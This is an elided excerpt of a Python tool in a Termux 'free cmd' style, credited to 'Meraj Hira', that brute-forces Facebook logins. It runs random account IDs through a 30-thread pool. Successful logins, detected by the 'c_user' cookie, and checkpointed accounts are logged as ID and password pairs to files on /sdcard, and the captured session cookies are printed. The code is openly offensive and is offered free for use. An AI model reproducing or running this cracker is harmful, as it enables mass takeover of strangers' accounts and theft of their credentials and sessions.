...
\x1b[1;97m[*]----------------------------------------------
\033[1;37m[*] Author        : Meraj Hira
\033[1;37m[*] Github        : m34j
\033[1;37m[*] Status        : FREE
\033[1;37m[*] TEAM          : Termux Free cmd
\033[1;37m[*] UPDATE BY     : I-C-P
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r {GREEN}[Hira] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
...
def Random():
    ...
    with ThreadPool(max_workers=30) as yaari:    
        ...
        print(f" {GREEN}COUNTRY YOU CHOOSE    : PAKISTAN ")
...
def free(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HIRA-,OK-😛]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [COOKIE] {coki}")
                open('/sdcard/HIRA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[HIRA-CP-]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/HIRA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|HIRA-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
